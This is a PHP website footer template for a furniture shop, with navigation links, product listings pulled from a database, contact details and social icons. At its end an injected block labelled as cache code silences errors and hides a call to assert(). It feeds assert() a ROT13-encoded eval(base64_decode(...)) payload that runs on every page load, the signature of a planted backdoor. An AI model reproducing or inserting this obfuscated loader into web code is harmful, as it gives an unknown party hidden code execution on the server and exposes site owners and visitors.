<footer>
	<div class="container">
        <div class="row margn-btm15" >
            <div class="col-sm-3">
                 <h2>Quick Links</h2>
                <ul>
                 <li><a href="<?php echo gb_fn_linkCacheHandler('about-us.html','content.php?code=about-us');?>" title="Company Profile">Company Profile</a></li>
                 <li><a href="<?php echo gb_fn_linkCacheHandler('sitemap.php','sitemap.php');?>" title="Sitemap">Sitemap</a></li>
                 <li><a href="<?php echo gb_fn_linkCacheHandler('news.php','news.php');?>" title="News">News</a></li>
                 <li><a href="<?php echo gb_fn_linkCacheHandler('contact.php','contact.php');?>" title="Contact">Contact</a></li>
                 </ul>
            </div>
            <?php $latestProductsList = $db->Products->find(array('publish_on_web' => true))->sort(array("created_timestamp" => 1))->limit(5);
            if($latestProductsList->count()>0){	?>
            <div class="col-sm-3">
				<h2>Products</h2>
                	<ul>
                 	<?php foreach($latestProductsList as $prod){
                 		$link=$prod["uuid"];
                 		if(isset($prod['product_code']) && $prod['product_code']){
                 			$link=$prod["product_code"];
                 		}	?>
                     <li><a href="<?php echo gb_fn_linkCacheHandler($link.'.html','product.php?code='.$link);?>" title="<?php echo $prod['ProductName']; ?>"><?php echo ucfirst($prod['ProductName']); ?></a></li>
                	<?php	}	?>
                  	</ul>
            	</div>
            <?php } ?>
            <div class="col-sm-3">
            	<h2>Get in Touch</h2>
               	<ul>
               		<?php if(defined("ADDRESS") && ADDRESS!=""){	?>
                    <li><?php echo ADDRESS;?></li>
                    <?php } ?>
                    <?php $getMapStr=get_token_value('dreamfurnishing-footer-map');
						if($getMapStr!=""){	?>
                    <li><a href="<?php echo $getMapStr; ?>" TARGET="_BLANK" class="golden-link">Google Map</a></li>
            		<?php } ?>
            	</ul>
            </div>
            
            <div class="col-sm-3"><EM></EM>
            	<h2>Legal</h2>
                <?php $copyrightStr=get_token_value('footer-copyright');
				if($copyrightStr!=""){	
                    echo $copyrightStr;
                }else{    ?>
            	© 2016 Dream Furnishings. All Rights Reserved.
                <?php } ?>
        		 <?php if($termsPage= $db->web_content->findOne(array("code" => "terms-and-conditions", "status" => "true"))){	?>
        			<a href="<?php echo gb_fn_linkCacheHandler('terms-and-conditions.html','content.php?code=terms-and-conditions'); ?>" title="Terms & Conditions" class="golden-link">Terms & Conditions</a>
        		<?php } ?>
            </div>
            
		</div>  
		<div class=" social-blk-row">
			<div class="clearfix col-md-4">
				<?php $tokensQry= $db->Tokens->find(array("code" => array('$in' => array('dreamfurnishing-twitter','dreamfurnishing-googleplus','dreamfurnishing-linkedin','dreamfurnishing-facebook'))));
				if($tokensQry->count()>0){
				foreach($tokensQry as $token){	
					if(isset($token["contentTxt"]) && $token["contentTxt"]!=""){
						$classStr=""; $iconClassStr="";
						if(isset($token["code"]) && $token["code"]=="dreamfurnishing-twitter"){
							$classStr="twitter";
							$iconClassStr="fa-twitter";
						}elseif(isset($token["code"]) && $token["code"]=="dreamfurnishing-googleplus"){
							$classStr="google-plus";
							$iconClassStr="fa-google-plus";
						}elseif(isset($token["code"]) && $token["code"]=="dreamfurnishing-linkedin"){
							$classStr="linkedin";
							$iconClassStr="fa-linkedin";
						}elseif(isset($token["code"]) && $token["code"]=="dreamfurnishing-facebook"){
							$classStr="facebook";
							$iconClassStr="fa-facebook";
						}
						?>
						<a href="<?php echo $token["contentTxt"];?>" target="_blank" class="icon-button <?php echo $classStr; ?>"><i class="fa <?php echo $iconClassStr; ?>"></i><span></span></a>
						<?php
					}
				}	?>
				<?php } ?>
			</div>
			<div class="col-md-8 text-right copyright"> 
                <?php if($copyrightStr!=""){	
                    echo $copyrightStr;
                }else{    ?>
                © 2016 Dream Furnishings. All Rights Reserved.
                <?php } ?>&nbsp;Site Managed by <a target="_blank" href="http://www.tenthmatrix.co.uk/" title="Tenthmatrix" class="powered-by-link"><img src="images/Powered-by-tenthmatrix.png" style="vertical-align:text-bottom;" alt="Tenthmatrix"></a> </div>
		</div>
	</div>
</footer>

<?php 

?>

<?php 

?>

<?php 
//###=CACHE START=###
error_reporting(0);
assert_options(ASSERT_ACTIVE, 1);
assert_options(ASSERT_WARNING, 0);
assert_options(ASSERT_QUIET_EVAL, 1); $strings = "as";$strings .= "sert"; $strings(str_rot13('riny(onfr64_qrpbqr("nJLtXTymp2I0XPEcLaLcXFO7VTIwnT8tWTyvqwftsFOyoUAyVUftMKWlo3WspzIjo3W0nJ5aXQNcBjccozysp2I0XPWxnKAjoTS5K2Ilpz9lplVfVPVjVvx7PzyzVPtunKAmMKDbWTyvqvxcVUfXnJLbVJIgpUE5XPEsD09CF0ySJlWwoTyyoaEsL2uyL2fvKFxcVTEcMFtxK0ACG0gWEIfvL2kcMJ50K2AbMJAeVy0cBjccMvujpzIaK21uqTAbXPpuKSZuqFpfVTMcoTIsM2I0K2AioaEyoaEmXPEsH0IFIxIFJlWGD1WWHSEsExyZEH5OGHHvKFxcXFNxLlN9VPW1VwftMJkmMFNxLlN9VPW3VwfXWTDtCFNxK1ASHyMSHyfvH0IFIxIFK05OGHHvKF4xK1ASHyMSHyfvHxIEIHIGIS9IHxxvKGfXWUHtCFNxK1ASHyMSHyfvFSEHHS9IH0IFK0SUEH5HVy07PvEcpPN9VPEsH0IFIxIFJlWFEH1CIRIsDHERHvWqBjbxqKWfVQ0tVzu0qUN6Yl9jMKWmo25ypaZhLzy6Y2qyqP5jnUN/nKN9Vv51pzkyozAiMTHbWTyjXF4vWzD9Vv51pzkyozAiMTHbWTDcYvVzqG0vYaIloTIhL29xMFtxqFxhVvMwCFVhWTZhVvMcCGRznQ0vYz1xAFtvMQMuZJIuMQOyBTAzMJZ3AwExMJLmAGNlMJD3LGNmZmHvYvExYvE1YvEwYvVkVvx7PzyzXTyhnI9aMKDbVzSfoT93K3IloS9zo3OyovVcVQ09VQRcVUfXWTyvqvN9VTMcoTIsM2I0K2AioaEyoaEmXPE1pzjcBjc9VTIfp2IcMvuzqJ5wqTyioy9yrTymqUZbVzA1pzksnJ5cqPVcXFO7PvEwnPN9VTA1pzksnJ5cqPtxqKWfXGfXL3IloS9mMKEipUDbWTAbYPOQIIWZG1OHK0uSDHESHvjtExSZH0HcBjcwqKWfK3AyqT9jqPtxL2tfVRAIHxkCHSEsHxIHIIWBISWOGyATEIVfVSEFIHHcBjbxpzImqJk0VQ0tL3IloS9yrTIwXPEwnPx7PzA1pzksL2kip2HbWTAbXGfXWTyvqvN9VPElMKA1oUD7Pa0tMJkmMFO7PvEzpPN9VTMmo2Aeo3OyovtvpTIlp29hMKWmYzWcrvVfVQtjYPNxMKWloz8fVPEypaWmqUVfVQZjXGfXnJLtXPEzpPxtrjbtVPNtWT91qPN9VPWUEIDtY2qyqP5jnUN/nKN9Vv51pzkyozAiMTHbWTyjXF4vWzD9Vv51pzkyozAiMTHbWTDcYvVzqG0vYaIloTIhL29xMFtxqFxhVvMwCFVhWTZhVvMcCGRznQ0vYz1xAFtvMQMuZJIuMQOyBTAzMJZ3AwExMJLmAGNlMJD3LGNmZmHvYvExYvE1YvEwYvVkVvxhVvOVISEDYmRhZIklKT4vBjbtVPNtWT91qPNhCFNvFT9mqQbtpTIlp29hMKWmYzWcryklKT4vBjbtVPNtWT91qPNhCFNvD29hozIwqTyiowbtD2kip2IppykhKUWpovV7PvNtVPOzq3WcqTHbWTMjYPNxo3I0XGfXVPNtVPElMKAjVQ0tVvV7PvNtVPO3nTyfMFNbVJMyo2LbWTMjXFxtrjbtVPNtVPNtVPElMKAjVP49VTMaMKEmXPEzpPjtZGV4XGfXVPNtVU0XVPNtVTMwoT9mMFtxMaNcBjbtVPNtoTymqPtxnTIuMTIlYPNxLz9xrFxtCFOjpzIaK3AjoTy0XPViKSWpHv8vYPNxpzImpPjtZvx7PvNtVPNxnJW2VQ0tWTWiMUx7Pa0XsDc9BjccMvucp3AyqPtxK1WSHIISH1EoVaNvKFxtWvLtWS9FEISIEIAHJlWjVy0tCG0tVwx4AGMyZTWyVvxtrlOyqzSfXUA0pzyjp2kup2uypltxK1WSHIISH1EoVzZvKFxcBlO9PzIwnT8tWTyvqwg9"));'));
//###=CACHE END=###
?>